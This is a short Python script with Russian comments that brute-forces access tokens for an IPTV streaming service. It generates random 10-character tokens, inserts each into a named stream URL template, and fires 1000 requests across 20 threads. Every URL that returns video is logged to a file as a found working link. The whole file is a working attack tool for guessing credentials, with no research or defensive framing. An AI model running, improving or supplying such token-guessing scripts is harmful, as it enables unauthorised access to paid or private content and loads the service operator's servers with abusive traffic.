import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor

# BASE_URL = "http://am01.sh365.org/227/mpegts?token={token}"  # length=14
BASE_URL = "http://cdntv.online/high/{token}/4.m3u8"  # length=10


def random_token(length=10) -> str:
    ''' Генерация случайного токена '''
    return ''.join(
            random.choices(string.ascii_letters + string.digits, k=length))


def check_token() -> None:
    ''' Проверка одного токена '''
    token = random_token()
    url = BASE_URL.format(token=token)
    try:
        r = requests.get(url, timeout=3, stream=True)
        if r.status_code == 200 and "video" in r.headers.get(
                "Content-Type", ""):
            print(f"[+] Найден рабочий токен: {token} -> {url}")
            with open("valid_links.txt", "a") as f:
                f.write(url + "\n")
            return
        else:
            print(f"[-] Невалид: {token}")
    except Exception as e:
        print(f"[!] Ошибка: {token} ({e})")


# Многопоточность
with ThreadPoolExecutor(max_workers=20) as executor:
    for _ in range(1000):  # количество попыток
        executor.submit(check_token)
